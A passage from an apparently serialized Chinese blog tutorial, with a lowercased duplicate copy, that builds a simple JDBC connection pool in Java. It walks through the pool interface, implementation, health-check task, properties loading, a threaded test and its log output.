poolEntry.getLastUsed() > config.getTimeout()) {\n                    try {\n                        poolEntry.getConnection().close();\n                        usedPools.remove(poolEntry);\n                        currentConnectCount.decrementAndGet();\n                        log.info("检测到连接超时，关闭连接，当前连接数：{}，最大连接数：{}，空闲连接池：{}，正在使用的连接池：{}",\n                                currentConnectCount.get(), config.getMaxSize(), freePools.size(), usedPools.size());\n                    } catch (SQLException e) {\n                        log.error("检测到连接超时，关闭连接失败", e);\n                    }\n                }\n            }\n            // 3. 定时检查最小连接数：如果空闲连接池小于最小连接数，则创建连接加载到空闲连接池\n            while (freePools.size() < config.getInitSize()) {\n                Connection conn = createConn();\n                if (conn != null) {\n                    freePools.add(conn);\n                    log.info("检测到空闲连接池小于最小连接数，创建连接加载到空闲连接池，当前连接数：{}，最小连接数：{}，空闲连接池：{}，正在使用的连接池：{}",\n                            currentConnectCount.get(), config.getInitSize(), freePools.size(), usedPools.size());\n                }\n            }\n            // 4. 检查最小连接数、超过最小连接数则检查最大空闲时间，大于指定时间则删除连接\n\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n194\n195\n196\n197\n198\n199\n200\n201\n202\n203\n204\n205\n206\n207\n208\n209\n210\n211\n212\n213\n214\n215\n216\n217\n218\n219\n220\n221\n222\n223\n224\n225\n226\n227\n228\n229\n230\n231\n232\n233\n234\n235\n236\n237\n238\n239\n240\n241\n242\n243\n244\n\n\n解析：\n\n * 连接池初始化：在构造函数中，根据配置参数初始化连接池，预先创建一定数量的连接。\n * 创建新连接：通过 DriverManager 获取新的数据库连接。\n * 获取连接：尝试从池中获取连接，如果池中无可用连接且未达到最大池容量，则创建新连接。若已达最大连接数，则等待后重试。\n * 释放连接：将使用完毕的连接归还池中，如果池已满，则关闭该连接。\n * 关闭连接池：遍历池中的所有连接并关闭，释放资源。\n * 定时任务：检查空闲和使用中的连接有效性及超时情况，并根据需要调整连接数量。\n\n\n# 连接对象管理\n\nPoolEntry 封装了实际的 JDBC 连接，并添加了一些额外的管理功能，如连接的使用状态、最后使用时间等。\n\npackage com.snail.source.code.jdbc.connection.domain;\n\nimport lombok.AllArgsConstructor;\nimport lombok.Data;\nimport lombok.NoArgsConstructor;\n\nimport java.sql.Connection;\n\n/**\n * @author zhangpengjun\n * @date 2024/8/22\n */\n@Data\n@NoArgsConstructor\n@AllArgsConstructor\npublic class PoolEntry {\n\n    /**\n     * 连接\n     */\n    private Connection connection;\n    /**\n     * 是否使用中\n     */\n    private boolean inUse;\n    /**\n     * 最后使用时间\n     */\n    private long lastUsed;\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n解析：\n\n * 状态管理：通过 inUse 标记连接是否正在被使用。\n * 使用时间管理：记录连接的最后使用时间，用于连接的回收和检测。\n\n\n# 配置管理\n\nDataSourceProperties 负责加载和管理连接池的配置参数，如初始池大小、最大池大小、数据库连接信息等。\n\npackage com.snail.source.code.jdbc.connection.properties;\n\nimport lombok.Data;\n\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\nimport java.util.Map;\nimport java.util.Properties;\n\n/**\n * @author zhangpengjun\n * @date 2024/8/21\n */\n@Data\npublic class DataSourceProperties {\n\n    private String driver;\n    private String url;\n    private String username;\n    private String password;\n    private Integer initSize;\n    private Integer maxSize;\n    private Boolean health;\n    private Long delay;\n    private Long period;\n    private Integer timeout;\n\n    public DataSourceProperties() {\n        Properties properties = new Properties();\n        try {\n            properties.load(DataSourceProperties.class.getClassLoader().getResourceAsStream("db.properties"));\n            for (Map.Entry<Object, Object> entry : properties.entrySet()) {\n                Object key = entry.getKey();\n                Object value = entry.getValue();\n                String fieldName = key.toString().replace("jdbc.", "");\n\n                Field field = this.getClass().getDeclaredField(fieldName);\n                Class<?> fieldType = field.getType();\n                Object convertedValue = convertValue(value, fieldType);\n\n                String methodName = "set" + fieldName.substring(0, 1).toUpperCase() + fieldName.substring(1);\n                Method method = this.getClass().getDeclaredMethod(methodName, field.getType());\n                method.invoke(this, convertedValue);            }\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    private Object convertValue(Object value, Class<?> fieldType) {\n        if (value == null && !fieldType.isPrimitive()) {\n            return null;\n        } else if (value == null) {\n            return null;\n        } else if (fieldType == Integer.TYPE || fieldType == Integer.class) {\n            return Integer.parseInt((String) value);\n        } else if (fieldType == Long.TYPE || fieldType == Long.class) {\n            return Long.parseLong((String) value);\n        } else if (fieldType == Boolean.TYPE || fieldType == Boolean.class) {\n            return Boolean.parseBoolean((String) value);\n        } else if (fieldType == Float.TYPE || fieldType == Float.class) {\n            return Float.parseFloat((String) value);\n        } else if (fieldType == Double.TYPE || fieldType == Double.class) {\n            return Double.parseDouble((String) value);\n        } else if (fieldType == String.class) {\n            return value.toString();\n        } else {\n            throw new IllegalArgumentException("Unsupported type: " + fieldType.getName());\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n\n\n解析：\n\n * 配置加载：从 db.properties 文件中读取配置参数。\n * 默认值设置：为部分配置项设置了默认值，确保在缺少配置时系统仍能正常运行。（后续优化）\n * 灵活性：通过 Getter 和 Setter 方法，允许动态调整配置参数。（后续添加 nacos 优化）\n\n\n# 添加配置文件\n\n添加 db.properties 配置文件。\n\njdbc.driver=com.mysql.cj.jdbc.Driver\njdbc.url=jdbc:mysql://localhost:3306/imall?useUnicode=true&characterEncoding=UTF-8&serverTimezone=Asia/Shanghai&allowMultiQueries=true&useSSL=false&requireSSL=false&allowPublicKeyRetrieval=true&zeroDateTimeBehavior=convertToNull\njdbc.username=root\njdbc.password=12345678\n\n# 初始化连接数\njdbc.initSize=3\n# 最大连接数\njdbc.maxSize=6\n#是否启动检查\njdbc.health=true\n#检查延迟时间\njdbc.delay=2000\n#间隔时间，重复获得连接的频率\njdbc.period=2000\n# 连接超时时间，10S\njdbc.timeout=100000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 简化连接池管理\n\nConnectionPoolManager 负责操作一个连接从连接池的获取和释放。\n\npackage com.snail.source.code.jdbc.connection.manager;\n\nimport com.snail.source.code.jdbc.connection.pool.ConnectionPool;\nimport com.snail.source.code.jdbc.connection.pool.SimpleConnectionPool;\nimport com.snail.source.code.jdbc.connection.properties.DataSourceProperties;\nimport lombok.NoArgsConstructor;\n\nimport java.sql.Connection;\n\n/**\n * @author zhangpengjun\n * @date 2024/8/22\n */\n@NoArgsConstructor(access = lombok.AccessLevel.PRIVATE)\npublic class ConnectionPoolManager {\n\n    private static final DataSourceProperties config = new DataSourceProperties();\n    private static final ConnectionPool CONNECTION_POOL = new SimpleConnectionPool(config);\n\n    /**\n     * 获取连接(重复利用机制)\n     *\n     * @return {@link Connection }\n     */\n    public static Connection getConnection() {\n        return CONNECTION_POOL.getConnection();\n    }\n\n    /**\n     * 释放连接(可回收机制)\n     *\n     * @param connection 连接\n     */\n    public static void releaseConnection(Connection connection) {\n        CONNECTION_POOL.releaseConnection(connection);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n\n# 测试\n\n对手写的简化版 JDBC 连接池进行并发获取测试，验证核心功能。\n\n\n# 编写测试程序\n\npackage com.snail.source.code.jdbc.connection;\n\nimport com.snail.source.code.jdbc.connection.manager.ConnectionPoolManager;\n\nimport java.sql.Connection;\n\nimport static java.lang.Thread.sleep;\n\n/**\n * @author zhangpengjun\n * @date 2024/8/22\n */\npublic class TestDataSource {\n\n    public static void main(String[] args) {\n        for (int i = 0; i < 10; i++) {\n            new Thread(new ThreadConnection(), "thread-" + i).start();\n        }\n    }\n\n    static class ThreadConnection implements Runnable {\n        @Override\n        public void run() {\n            Connection connection = ConnectionPoolManager.getConnection();\n            try {\n                sleep(1000);\n            } catch (InterruptedException e) {\n                throw new RuntimeException(e);\n            }\n            ConnectionPoolManager.releaseConnection(connection);\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n\n# 查看结果\n\n可以看到：初始化连接数为 3 个，最大连接数为 6 个。超过最大连接数会等待。最后释放连接。\n\n18:11:25.432 [thread-0] INFO SimpleConnectionPool - 初始化连接池，当前连接数：3，初始化连接数：3, 最大连接数：6，空闲连接池：3，正在使用的连接池：0\n18:11:25.434 [thread-0] INFO SimpleConnectionPool - [从空闲连接池获取连接]，当前连接数：3，最大连接数：6，空闲连接池：2，正在使用的连接池：1\n18:11:25.434 [thread-1] INFO SimpleConnectionPool - [从空闲连接池获取连接]，当前连接数：3，最大连接数：6，空闲连接池：1，正在使用的连接池：2\n18:11:25.435 [thread-3] INFO SimpleConnectionPool - [从空闲连接池获取连接]，当前连接数：3，最大连接数：6，空闲连接池：0，正在使用的连接池：3\n18:11:25.438 [thread-2] INFO SimpleConnectionPool - [空闲连接池已满，未达到最大连接数，新建连接]，当前连接数：4，最大连接数：6，空闲连接池：0，正在使用的连接池：4\n18:11:25.440 [thread-4] INFO SimpleConnectionPool - [空闲连接池已满，未达到最大连接数，新建连接]，当前连接数：5，最大连接数：6，空闲连接池：0，正在使用的连接池：5\n18:11:25.441 [thread-6] INFO SimpleConnectionPool - [空闲连接池已满，未达到最大连接数，新建连接]，当前连接数：6，最大连接数：6，空闲连接池：0，正在使用的连接池：6\n18:11:25.543 [thread-7] INFO SimpleConnectionPool - [空闲连接池已满，达到最大连接数]，等待后重试。当前连接数：6，最大连接数：6，空闲连接池：0，正在使用的连接池：6\n18:11:25.543 [thread-9] INFO SimpleConnectionPool - [空闲连接池已满，达到最大连接数]，等待后重试。当前连接数：6，最大连接数：6，空闲连接池：0，正在使用的连接池：6\n18:11:25.543 [thread-8] INFO SimpleConnectionPool - [空闲连接池已满，达到最大连接数]，等待后重试。当前连接数：6，最大连接数：6，空闲连接池：0，正在使用的连接池：6\n18:11:25.543 [thread-5] INFO SimpleConnectionPool - [空闲连接池已满，达到最大连接数]，等待后重试。当前连接数：6，最大连接数：6，空闲连接池：0，正在使用的连接池：6\n18:11:26.437 [thread-3] INFO SimpleConnectionPool - [归还连接到空闲连接池]，当前连接数：6，最大连接数：6，空闲连接池：1，正在使用的连接池：5\n18:11:26.438 [thread-0] INFO SimpleConnectionPool - [归还连接到空闲连接池]，当前连接数：6，最大连接数：6，空闲连接池：2，正在使用的连接池：4\n18:11:26.438 [thread-1] INFO SimpleConnectionPool - [归还连接到空闲连接池]，当前连接数：6，最大连接数：6，空闲连接池：3，正在使用的连接池：3\n18:11:26.443 [thread-2] INFO SimpleConnectionPool - [归还连接到空闲连接池]，当前连接数：6，最大连接数：6，空闲连接池：4，正在使用的连接池：2\n18:11:26.444 [thread-6] INFO SimpleConnectionPool - [归还连接到空闲连接池]，当前连接数：6，最大连接数：6，空闲连接池：5，正在使用的连接池：1\n18:11:26.444 [thread-4] INFO SimpleConnectionPool - [归还连接到空闲连接池]，当前连接数：6，最大连接数：6，空闲连接池：6，正在使用的连接池：0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n',normalizedContent:'在现代应用程序中，数据库连接池是提升性能和资源管理的关键组件。本文将从零开始，详细讲解如何实现一个高效的 jdbc 连接池。无论你是初学者还是有一定经验的开发者，相信本文都能为你提供有价值的指导。\n\n项目代码地址：传送门\n\n\n\n * 环境准备\n * 项目结构概览\n   * 主要模块介绍\n * 核心模块解析实现\n   * 连接池接口设计\n   * 连接池实现\n   * 连接对象管理\n   * 配置管理\n   * 添加配置文件\n   * 简化连接池管理\n * 测试\n   * 编写测试程序\n   * 查看结果\n\n\n\n\n# 环境准备\n\n在开始之前，请确保你的开发环境具备以下条件：\n\n * jdk 8 或以上：确保你已经安装了 java 开发环境，可以通过 java -version 命令检查。\n * maven：用于项目的依赖管理和构建。\n * ide：推荐使用 intellij idea 或 eclipse 进行开发和调试。\n\n\n# 项目结构概览\n\njdbc 连接池模块主要包含以下几个核心部分：\n\n(base) ~/ideaprojects/snail/snail-source-code/source-jdbc-connection-pool\n├── pom.xml\n└── src\n    ├── main\n    │   ├── java\n    │   │   └── com\n    │   │       └── snail\n    │   │           └── source\n    │   │               └── code\n    │   │                   └── jdbc\n    │   │                       └── connection\n    │   │                           ├── domain\n    │   │                           │   └── poolentry.java\n    │   │                           ├── manager\n    │   │                           │   └── connectionpoolmanager.java\n    │   │                           ├── pool\n    │   │                           │   ├── connectionpool.java\n    │   │                           │   └── simpleconnectionpool.java\n    │   │                           └── properties\n    │   │                               └── datasourceproperties.java\n    │   └── resources\n    │       └── db.properties\n    └── test\n        └── java\n            └── com\n                └── snail\n                    └── source\n                        └── code\n                            └── jdbc\n                                └── connection\n                                    └── testdatasource.java\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# 主要模块介绍\n\n * poolentry 接口：封装实际的 jdbc 连接对象。\n * connectionpoolmanager 类：简化连接池操作的管理者，提供了一组静态方法来获取和释放数据库连接。\n * connectionpool 类：定义获取和释放数据库连接的方法。\n * simpleconnectionpool 类：connectionpool 接口的具体实现。\n * datasourceproperties 类：管理连接池的配置参数。\n\n\n# 核心模块解析实现\n\n接下来，我们将逐个模块进行详细解析，理解其设计思想和实现细节。\n\n\n# 连接池接口设计\n\nconnectionpool 定义了连接池的基本操作接口，包括获取连接、释放连接、关闭连接池等方法。\n\npackage com.snail.source.code.jdbc.connection.pool;\n\nimport java.sql.connection;\nimport java.sql.sqlexception;\n\n/**\n * 连接池\n *\n * @author zhangpengjun\n * @date 2024/8/21\n */\npublic interface connectionpool {\n\n    /**\n     * 获取连接\n     *\n     * @return {@link connection }\n     */\n    connection getconnection();\n\n    /**\n     * 释放连接\n     *\n     * @param conn 连接\n     */\n    void releaseconnection(connection conn);\n\n    /**\n     * 关闭连接池\n     */\n    void shutdown() throws sqlexception;\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n解析：\n\n * getconnection()：从连接池中获取一个可用的数据库连接。\n * releaseconnection(connection connection)：将使用完毕的连接归还给连接池。\n * shutdown()：关闭连接池，释放所有资源。\n\n\n# 连接池实现\n\nsimpleconnectionpool 是 connectionpool 接口的具体实现，负责管理连接的创建、分配和回收。\n\npackage com.snail.source.code.jdbc.connection.pool;\n\nimport com.snail.source.code.jdbc.connection.domain.poolentry;\nimport com.snail.source.code.jdbc.connection.properties.datasourceproperties;\nimport lombok.extern.slf4j.slf4j;\n\nimport java.sql.connection;\nimport java.sql.drivermanager;\nimport java.sql.sqlexception;\nimport java.util.list;\nimport java.util.timertask;\nimport java.util.concurrent.copyonwritearraylist;\nimport java.util.concurrent.executors;\nimport java.util.concurrent.scheduledexecutorservice;\nimport java.util.concurrent.timeunit;\nimport java.util.concurrent.atomic.atomicinteger;\n\n/**\n * @author zhangpengjun\n * @date 2024/8/21\n */\n@slf4j\npublic class simpleconnectionpool implements connectionpool {\n\n    /**\n     * 连接池配置\n     */\n    datasourceproperties config;\n    /**\n     * 当前连接数\n     */\n    private final atomicinteger currentconnectcount = new atomicinteger(0);\n    /**\n     * 空闲中的连接池\n     */\n    list<connection> freepools = new copyonwritearraylist<>();\n    /**\n     * 正在使用中的连接池\n     */\n    list<poolentry> usedpools = new copyonwritearraylist<>();\n    /**\n     * 调度器\n     */\n    private final scheduledexecutorservice scheduler = executors.newscheduledthreadpool(1, runnable -> {\n        thread thread = new thread(runnable);\n        thread.setdaemon(true); // 设置为守护线程\n        return thread;\n    });\n\n    public simpleconnectionpool(datasourceproperties config) {\n        this.config = config;\n        initializepool();\n    }\n\n    @override\n    public synchronized connection getconnection() {\n        connection conn = null;\n        if (usedpools.size() < config.getmaxsize()) {\n            // 优先从空闲连接池获取连接，空闲连接池满的情况下判断是否达到最大连接数，没达到最大连接数则继续创建连接\n            string connectionfrom;\n            if (!freepools.isempty()) {\n                conn = freepools.get(0);\n                freepools.remove(conn);\n                connectionfrom = "从空闲连接池获取连接";\n            } else {\n                // 空闲连接池已满，未达到最大连接数，新建连接\n                conn = createconn();\n                connectionfrom = "空闲连接池已满，未达到最大连接数，新建连接";\n            }\n            // 对连接进行校验，通过就放入活跃连接池\n            if (isalive(conn)) {\n                usedpools.add(new poolentry(conn, true, system.currenttimemillis()));\n                log.info("[{}]，当前连接数：{}，最大连接数：{}，空闲连接池：{}，正在使用的连接池：{}",\n                        connectionfrom, currentconnectcount.get(), config.getmaxsize(), freepools.size(), usedpools.size());\n            } else {\n                return getconnection();\n            }\n        } else {\n            // 空闲连接池已满，达到最大连接数，等待后重试\n            try {\n                this.wait(100);\n            } catch (interruptedexception e) {\n                thread.currentthread().interrupt();\n                throw new runtimeexception(e);\n            }\n            log.info("[空闲连接池已满，达到最大连接数]，等待后重试。当前连接数：{}，最大连接数：{}，空闲连接池：{}，正在使用的连接池：{}",\n                    currentconnectcount.get(), config.getmaxsize(), freepools.size(), usedpools.size());\n        }\n        return conn;\n    }\n\n    @override\n    public synchronized void releaseconnection(connection conn) {\n        if (!isalive(conn)) {\n            return;\n        }\n        // 从活跃连接池移除\n        for (poolentry entry : usedpools) {\n            if (entry.getconnection() == conn) {\n                usedpools.remove(entry);\n                break;\n            }\n        }\n        // 空闲连接池没满，则归还到空闲连接池，否则关闭连接\n        if (freepools.size() < config.getmaxsize()) {\n            freepools.add(conn);\n            log.info("[归还连接到空闲连接池]，当前连接数：{}，最大连接数：{}，空闲连接池：{}，正在使用的连接池：{}",\n                    currentconnectcount.get(), config.getmaxsize(), freepools.size(), usedpools.size());\n        } else {\n            // 关闭连接\n            try {\n                conn.close();\n                currentconnectcount.decrementandget();\n            } catch (sqlexception e) {\n                log.error("关闭连接失败", e);\n            }\n        }\n        notifyall();\n    }\n\n    @override\n    public synchronized void shutdown() throws sqlexception {\n        // 关闭活跃连接\n        for (poolentry entry : usedpools) {\n            releaseconnection(entry.getconnection());\n        }\n        // 关闭空闲连接\n        for (connection conn : freepools) {\n            conn.close();\n            currentconnectcount.decrementandget();\n        }\n    }\n\n    /**\n     * 创建连接\n     *\n     * @return {@link connection }\n     */\n    private synchronized connection createconn(){\n        connection conn = null ;\n        try {\n            conn = drivermanager.getconnection(config.geturl(), config.getusername(), config.getpassword());\n            currentconnectcount.incrementandget();\n        } catch (sqlexception e) {\n            log.error("创建连接失败", e);\n        }\n        return conn;\n    }\n\n    /**\n     * 校验是否有效\n     *\n     * @param conn 连接\n     * @return boolean\n     */\n    private boolean isalive(connection conn) {\n        try {\n            return conn != null && conn.isvalid(1000);\n        } catch (sqlexception e) {\n            log.error("校验连接是否有效失败", e);\n        }\n        return false;\n    }\n\n    /**\n     * 初始化\n     * <br>\n     * 根据配置加载连接到默认的空闲连接池\n     */\n    private void initializepool() {\n        // 获取连接池 initsize 配置，获取连接加载到空闲连接池\n        try {\n            class.forname(config.getdriver());\n            for (int i = 0; i < config.getinitsize(); i++) {\n                connection conn = createconn();\n                freepools.add(conn);\n            }\n            log.info("初始化连接池，当前连接数：{}，初始化连接数：{}, 最大连接数：{}，空闲连接池：{}，正在使用的连接池：{}",\n                    currentconnectcount.get(), config.getinitsize(), config.getmaxsize(), freepools.size(), usedpools.size());\n        } catch (classnotfoundexception e) {\n            log.error("加载驱动失败", e);\n            throw new runtimeexception(e);\n        }\n        check();\n    }\n\n    /**\n     * 开启定时任务检测连接\n     * 1. 定时检查空闲连接池：检查连接是否可用，如果不可用，则关闭连接，并从空闲连接池中移除\n     * 2. 定时检查正在使用的连接池：检查连接是否超时，如果超时，则关闭连接，并从正在使用的连接池中移除\n     * 3. 定时检查最小连接数：如果空闲连接池小于最小连接数，则创建连接加载到空闲连接池\n     */\n    private void check() {\n        if (boolean.true.equals(config.gethealth())) {\n            scheduler.scheduleatfixedrate(new checktask(), config.getdelay(), config.getperiod(), timeunit.milliseconds);\n        }\n    }\n\n    class checktask extends timertask {\n        @override\n        public void run() {\n            // 1. 定时检查空闲连接池：检查连接是否可用，如果不可用，则关闭连接，并从空闲连接池中移除\n            for (connection conn : freepools) {\n                if (!isalive(conn)) {\n                    try {\n                        conn.close();\n                    } catch (sqlexception e) {\n                        log.error("检测到连接不可用，关闭连接失败", e);\n                    }\n                    freepools.remove(conn);\n                    currentconnectcount.decrementandget();\n                    log.info("检测到连接不可用，关闭连接，当前连接数：{}，最大连接数：{}，空闲连接池：{}，正在使用的连接池：{}",\n                            currentconnectcount.get(), config.getmaxsize(), freepools.size(), usedpools.size());\n                }\n            }\n            // 2. 定时检查正在使用的连接池：检查连接是否超时，如果超时，则关闭连接，并从正在使用的连接池中移除\n            for (poolentry poolentry : usedpools) {\n                if (system.currenttimemillis() - poolentry.getlastused() > config.gettimeout()) {\n                    try {\n                        poolentry.getconnection().close();\n                        usedpools.remove(poolentry);\n                        currentconnectcount.decrementandget();\n                        log.info("检测到连接超时，关闭连接，当前连接数：{}，最大连接数：{}，空闲连接池：{}，正在使用的连接池：{}",\n                                currentconnectcount.get(), config.getmaxsize(), freepools.size(), usedpools.size());\n                    } catch (sqlexception e) {\n                        log.error("检测到连接超时，关闭连接失败", e);\n                    }\n                }\n            }\n            // 3. 定时检查最小连接数：如果空闲连接池小于最小连接数，则创建连接加载到空闲连接池\n            while (freepools.size() < config.getinitsize()) {\n                connection conn = createconn();\n                if (conn != null) {\n                    freepools.add(conn);\n                    log.info("检测到空闲连接池小于最小连接数，创建连接加载到空闲连接池，当前连接数：{}，最小连接数：{}，空闲连接池：{}，正在使用的连接池：{}",\n                            currentconnectcount.get(), config.getinitsize(), freepools.size(), usedpools.size());\n                }\n            }\n            // 4. 检查最小连接数、超过最小连接数则检查最大空闲时间，大于指定时间则删除连接\n\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n194\n195\n196\n197\n198\n199\n200\n201\n202\n203\n204\n205\n206\n207\n208\n209\n210\n211\n212\n213\n214\n215\n216\n217\n218\n219\n220\n221\n222\n223\n224\n225\n226\n227\n228\n229\n230\n231\n232\n233\n234\n235\n236\n237\n238\n239\n240\n241\n242\n243\n244\n\n\n解析：\n\n * 连接池初始化：在构造函数中，根据配置参数初始化连接池，预先创建一定数量的连接。\n * 创建新连接：通过 drivermanager 获取新的数据库连接。\n * 获取连接：尝试从池中获取连接，如果池中无可用连接且未达到最大池容量，则创建新连接。若已达最大连接数，则等待后重试。\n * 释放连接：将使用完毕的连接归还池中，如果池已满，则关闭该连接。\n * 关闭连接池：遍历池中的所有连接并关闭，释放资源。\n * 定时任务：检查空闲和使用中的连接有效性及超时情况，并根据需要调整连接数量。\n\n\n# 连接对象管理\n\npoolentry 封装了实际的 jdbc 连接，并添加了一些额外的管理功能，如连接的使用状态、最后使用时间等。\n\npackage com.snail.source.code.jdbc.connection.domain;\n\nimport lombok.allargsconstructor;\nimport lombok.data;\nimport lombok.noargsconstructor;\n\nimport java.sql.connection;\n\n/**\n * @author zhangpengjun\n * @date 2024/8/22\n */\n@data\n@noargsconstructor\n@allargsconstructor\npublic class poolentry {\n\n    /**\n     * 连接\n     */\n    private connection connection;\n    /**\n     * 是否使用中\n     */\n    private boolean inuse;\n    /**\n     * 最后使用时间\n     */\n    private long lastused;\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n解析：\n\n * 状态管理：通过 inuse 标记连接是否正在被使用。\n * 使用时间管理：记录连接的最后使用时间，用于连接的回收和检测。\n\n\n# 配置管理\n\ndatasourceproperties 负责加载和管理连接池的配置参数，如初始池大小、最大池大小、数据库连接信息等。\n\npackage com.snail.source.code.jdbc.connection.properties;\n\nimport lombok.data;\n\nimport java.lang.reflect.field;\nimport java.lang.reflect.method;\nimport java.util.map;\nimport java.util.properties;\n\n/**\n * @author zhangpengjun\n * @date 2024/8/21\n */\n@data\npublic class datasourceproperties {\n\n    private string driver;\n    private string url;\n    private string username;\n    private string password;\n    private integer initsize;\n    private integer maxsize;\n    private boolean health;\n    private long delay;\n    private long period;\n    private integer timeout;\n\n    public datasourceproperties() {\n        properties properties = new properties();\n        try {\n            properties.load(datasourceproperties.class.getclassloader().getresourceasstream("db.properties"));\n            for (map.entry<object, object> entry : properties.entryset()) {\n                object key = entry.getkey();\n                object value = entry.getvalue();\n                string fieldname = key.tostring().replace("jdbc.", "");\n\n                field field = this.getclass().getdeclaredfield(fieldname);\n                class<?> fieldtype = field.gettype();\n                object convertedvalue = convertvalue(value, fieldtype);\n\n                string methodname = "set" + fieldname.substring(0, 1).touppercase() + fieldname.substring(1);\n                method method = this.getclass().getdeclaredmethod(methodname, field.gettype());\n                method.invoke(this, convertedvalue);            }\n        } catch (exception e) {\n            throw new runtimeexception(e);\n        }\n    }\n\n    private object convertvalue(object value, class<?> fieldtype) {\n        if (value == null && !fieldtype.isprimitive()) {\n            return null;\n        } else if (value == null) {\n            return null;\n        } else if (fieldtype == integer.type || fieldtype == integer.class) {\n            return integer.parseint((string) value);\n        } else if (fieldtype == long.type || fieldtype == long.class) {\n            return long.parselong((string) value);\n        } else if (fieldtype == boolean.type || fieldtype == boolean.class) {\n            return boolean.parseboolean((string) value);\n        } else if (fieldtype == float.type || fieldtype == float.class) {\n            return float.parsefloat((string) value);\n        } else if (fieldtype == double.type || fieldtype == double.class) {\n            return double.parsedouble((string) value);\n        } else if (fieldtype == string.class) {\n            return value.tostring();\n        } else {\n            throw new illegalargumentexception("unsupported type: " + fieldtype.getname());\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n\n\n解析：\n\n * 配置加载：从 db.properties 文件中读取配置参数。\n * 默认值设置：为部分配置项设置了默认值，确保在缺少配置时系统仍能正常运行。（后续优化）\n * 灵活性：通过 getter 和 setter 方法，允许动态调整配置参数。（后续添加 nacos 优化）\n\n\n# 添加配置文件\n\n添加 db.properties 